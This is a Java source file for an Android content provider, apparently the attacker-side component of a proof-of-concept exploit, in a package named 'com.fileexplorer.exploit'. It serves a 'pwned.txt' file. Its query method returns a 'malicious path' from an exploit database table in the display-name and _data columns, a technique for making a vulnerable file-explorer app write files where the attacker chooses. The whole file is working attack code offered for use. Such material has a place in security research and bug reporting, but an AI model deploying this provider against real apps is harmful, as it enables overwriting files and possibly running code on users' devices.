package com.fileexplorer.exploit;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.util.Log;
import android.database.MatrixCursor;
import java.io.File;
import java.io.FileNotFoundException;

public class MyContentProvider extends ContentProvider {
    private DatabaseHelper dbHelper;
    private static final String TAG = "MyContentProvider"; // Tag for Logcat

    @Override
    public boolean onCreate() {
        Log.d(TAG, "onCreate called"); // Log provider creation
        dbHelper = new DatabaseHelper(getContext());
        Log.d(TAG, "DatabaseHelper initialized"); // Log DBHelper initialization
        return true;
    }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
        Log.d(TAG, "openFile called. URI: " + uri.toString() + ", Mode: " + mode); // Log the called URI and mode

        // Construct the file path *within your app's files directory*.  This is
        // *not* where the vulnerable app will write.  This file just needs to exist
        // so you can return a valid ParcelFileDescriptor.
        File file = new File(getContext().getFilesDir(), "pwned.txt");
        Log.d(TAG, "File path (inside exploit app): " + file.getAbsolutePath()); // Log *your* file path

        if (!file.exists()) {
            Log.e(TAG, "File does not exist: " + file.getAbsolutePath()); // Log if file doesn't exist
            throw new FileNotFoundException("File not found: " + file.getAbsolutePath());
        }

        try {
            ParcelFileDescriptor pfd = ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
            Log.d(TAG, "ParcelFileDescriptor opened successfully"); // Log successful PFD opening
            return pfd;
        } catch (FileNotFoundException e) {
            Log.e(TAG, "FileNotFoundException when opening ParcelFileDescriptor", e); // Log exception
            throw e; // Re-throw the exception to propagate it to the caller
        }
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection,
                        String[] selectionArgs, String sortOrder) {
        SQLiteDatabase db = dbHelper.getReadableDatabase();
        // Return the malicious path from the row you inserted
        return db.rawQuery(
                "SELECT display_name AS _display_name, _data, size AS _size FROM exploitTable LIMIT 1",
                null
        );
    }


    // public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    //    Log.d(TAG, "query called (not implemented)"); // Log unimplemented methods
    // return null;
    //}


    @Override
    public String getType(Uri uri) {
        Log.d(TAG, "getType called (not implemented)"); // Log unimplemented methods
        return null;
    }

    @Override
    public Uri insert(Uri uri, ContentValues values) {
        Log.d(TAG, "insert called (not implemented)"); // Log unimplemented methods
        return null;
    }

    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs) {
        Log.d(TAG, "delete called (not implemented)"); // Log unimplemented methods
        return 0;
    }

    @Override
    public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
        Log.d(TAG, "update called (not implemented)"); // Log unimplemented methods
        return 0;
    }
}
